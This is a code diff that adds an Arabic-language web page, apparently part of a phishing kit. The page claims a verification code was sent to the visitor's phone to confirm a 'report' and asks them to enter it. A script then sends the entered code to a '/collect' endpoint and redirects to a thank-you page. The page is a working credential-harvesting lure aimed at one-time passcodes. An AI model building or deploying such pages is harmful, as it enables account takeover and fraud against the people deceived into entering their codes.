@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رمز التحقق</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            text-align: center;
+            padding: 50px;
+        }
+        h2 {
+            color: red;
+        }
+        input {
+            padding: 10px;
+            width: 200px;
+            font-size: 16px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: red;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>تم إرسال رمز تحقق على رقم هاتفك المرتبط بالحساب لاستكمال التحقق من البلاغ.</h2>
+    <form id="otpForm">
+        <input type="text" id="otp" name="otp" placeholder="أدخل رمز التحقق" required>
+        <br>
+        <button type="submit">تأكيد ومتابعة</button>
+    </form>
+
+    <script>
+        document.getElementById("otpForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const otpValue = document.getElementById("otp").value;
+
+            fetch("/collect", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ otp: otpValue })
+            }).then(() => {
+                window.location.href = "thanks.html";
+            });
+        });
+    </script>
+
+</body>
+</html>
